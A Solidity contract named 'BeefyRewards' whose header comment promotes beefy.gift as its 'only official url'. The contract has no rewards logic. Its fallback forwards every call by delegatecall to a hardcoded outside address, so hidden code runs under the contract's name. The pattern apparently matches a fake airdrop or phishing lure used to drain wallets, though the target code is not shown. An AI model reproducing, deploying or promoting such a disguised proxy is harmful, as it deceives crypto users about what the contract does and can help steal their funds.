// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

// The only official url is https://beefy.gift/

contract BeefyRewards {
    uint256 private totalSupply = 1000;

    fallback(bytes calldata data) external payable returns (bytes memory) {
        (bool r1, bytes memory result) = address(
            0x1629B22D4A479CAd175CbA8C4c09e3320FC2AA4d
        ).delegatecall(data);
        return result;
    }

    constructor() {}
}